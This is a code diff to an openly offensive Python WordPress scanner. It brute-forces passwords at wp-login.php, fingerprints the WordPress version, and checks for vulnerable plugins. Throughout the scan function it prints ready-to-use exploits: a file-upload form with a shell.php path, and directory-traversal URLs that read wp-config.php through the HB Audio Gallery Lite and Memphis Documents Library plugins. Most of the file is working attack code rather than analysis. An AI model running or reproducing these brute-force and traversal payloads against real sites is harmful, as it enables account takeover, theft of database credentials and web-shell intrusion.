@@ -1,5 +1,9 @@
+
 import requests
 import argparse
+import re
+
+
 
 class WordPress_Scan():
 	def __init__(self,dict):
@@ -10,20 +14,35 @@ class WordPress_Scan():
 
 	def Brute_Force(self):
 		print "start Brute_Force......"
- 		self.path4 = "http://{0}".format(self.url)+'wp-login.php'
+ 		self.path4 = "http://{0}".format(self.url)+'/wp-login.php'
  		for self.temp in open(self.pwdfile):
 			self.passwd = self.temp.strip()
 			self.payload = {'log':self.username,'pwd':self.passwd,'redirect_to':''}
-			self.re = requests.post(self.path4, data = self.payload)
-			if (self.re.text == ''):
+			self.bre_re = requests.post(self.path4, data = self.payload)
+			if (self.bre_re.text == ''):
 				print "\33[32m[+] test password %s : success !\33[0m" %self.passwd
+				break
 			else:
 				print "[-] test password %s : fail" %self.passwd
 
+	def VersionScan(self):
+		self.Version_Path =  "http://{0}".format(self.url)+'/readme.html'
+		self.Version_Page = requests.get(self.Version_Path)
+		self.Version_Page.encoding='utf-8'
+		if(self.Version_Page.status_code == 200):
+			self.Version_text = self.Version_Page.text
+			#print self.Version_text
+			self.reg = r'<br />(.+?)</h1>'
+			self.RegEx = re.compile(self.reg,re.S)
+			self.Version = re.findall(self.RegEx,self.Version_text)
+			for line in self.Version:
+				print "Wordpress Version:%s" %line.encode("utf-8")
+
 	def scan(self):
+		self.VersionScan()
 		#Wordpress Plugins jQuery Html5 File Upload
-		self.path1 =   "http://{0}".format(self.url)+'wp-admin/admin-ajax.php?action=load_ajax_function'
-		self.path2 =  "http://{0}".format(self.url)+'wp-content/plugins/jquery-html5-file-upload/'
+		self.path1 =   "http://{0}".format(self.url)+'/wp-admin/admin-ajax.php?action=load_ajax_function'
+		self.path2 =  "http://{0}".format(self.url)+'/wp-content/plugins/jquery-html5-file-upload/'
 		self.re1= requests.get(self.path2)
 		if(self.re1.status_code == 403 or self.re1.status_code == 200):
 			self.re2 = requests.get(self.path1)
@@ -32,14 +51,14 @@ class WordPress_Scan():
  				print "Exploit: \n\t""\33[32m"'<form method="POST" action="test.com/ enctype="multipart/form-data"> <input type="file" name="files[]" /><button>Upload</button>'"\033[0m"
  				print "Shell Access :\n\t\33[32m http://www.test.com/wp-content/uploads/files/guest/shell.php \033[0m"
  		#Wordpress Plugin HB Audio Gallery Lite - Arbitrary File Download
- 		self.path3 = "http://{0}".format(self.url)+'wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php'
+ 		self.path3 = "http://{0}".format(self.url)+'/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php'
  		self.re3 = requests.get(self.path3)
  		if(self.re3.status_code ==  200):
  			print "\33[31m"'[+]  Wordpress Plugin HB Audio Gallery Lite - Arbitrary File Download'"\033[0m"
  			print "Exploit: \n\t""\33[32m"'http://www.test.com/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_path=../../../../wp-config.php&file_size=10'"\033[0m"
 
  		#WordPress Memphis Document Library Plugin 3.1.5 Path Disclosure
- 		self.path5 = "http://{0}".format(self.url)+'wp-content/plugins/memphis-documents-library/mdocs-downloads.php'
+ 		self.path5 = "http://{0}".format(self.url)+'/wp-content/plugins/memphis-documents-library/mdocs-downloads.php'
  		self.path6 = "http://{0}".format(self.url)+'?mdocs-img-preview=../../../wp-config.php -o example-wp-config.php'
  		self.re4 = requests.get(self.path5)
  		if(self.re4.status_code == 200):
